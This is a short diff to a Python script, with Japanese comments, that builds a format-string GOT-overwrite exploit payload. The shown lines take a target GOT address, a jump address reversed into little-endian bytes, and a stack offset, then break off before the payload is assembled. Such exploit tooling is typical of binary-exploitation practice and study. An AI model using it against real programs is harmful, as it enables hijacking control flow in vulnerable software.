@@ -1,11 +1,12 @@
+# print format attack
 # create GOT Overwrite Attack shellcode
 import sys
 import re
 
-start_address = int(sys.argv[1][2:], 16) # 0x80499f4(GOT対象アドレス)
-values = re.split('(..)', sys.argv[2][2:])[1::2] # 0x8048691(飛ばしたいアドレス)
-values.reverse() # little endian
-number = int(sys.argv[3]) # 6番目
+start_address = int(sys.argv[1][2:], 16) # GOT対象アドレス
+values = re.split('(..)', sys.argv[2][2:])[1::2] # 飛ばしたいアドレス
+values.reverse() # リトルエンディアン
+number = int(sys.argv[3]) # 書き込むスタックの開始位置
 output = ''
 byte_counter = 0
 
